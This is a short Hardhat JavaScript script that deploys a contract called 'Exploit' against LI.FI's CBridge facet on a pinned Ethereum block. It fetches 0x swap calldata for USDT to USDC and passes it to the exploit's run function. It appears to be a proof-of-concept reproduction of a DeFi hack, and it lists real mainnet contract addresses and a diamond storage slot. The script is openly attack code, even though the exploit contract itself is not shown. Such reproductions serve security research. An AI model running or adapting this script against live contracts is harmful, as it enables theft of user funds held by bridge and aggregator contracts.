const axios = require('axios');
const ethers = hre.ethers;

const blockNumber = 14420686;

// keccak256("com.lifi.facets.cbridge2") = 0x86b79a219228d788dd4fea892f48eec79167ea6d19d7f61e274652b2797c5b12
const CBridgeFacetAddress = '0x5A9Fd7c39a6C488E715437D7b1f3C823d5596eD1';
const slot = '0x86b79a219228d788dd4fea892f48eec79167ea6d19d7f61e274652b2797c5b12';

const CBridgeAddress = '0x5427fefa711eff984124bfbb1ab6fbf5e3da1820';
const UniswapV2RouterAddress = '0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D';

const USDTAddress = '0xdAC17F958D2ee523a2206206994597C13D831ec7';
const USDCAddress = '0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48';

async function getZeroExCallData() {
    let url = 'https://api.0x.org/swap/v1/quote';
    url += '?sellToken=USDT';
    url += '&buyToken=USDC';
    url += '&sellAmount=50000000';

    const res = await axios.get(url)
    return res.data.data;
}

async function main() {
    const Exploit = await ethers.getContractFactory('Exploit');
    const exploit = await Exploit.deploy();
    const callData = await getZeroExCallData();
    await exploit.run(ethers.utils.arrayify(callData));  
}

main()
    .then(() => process.exit(0))
    .catch((error) => {
        console.error(error);
        process.exit(1);
    });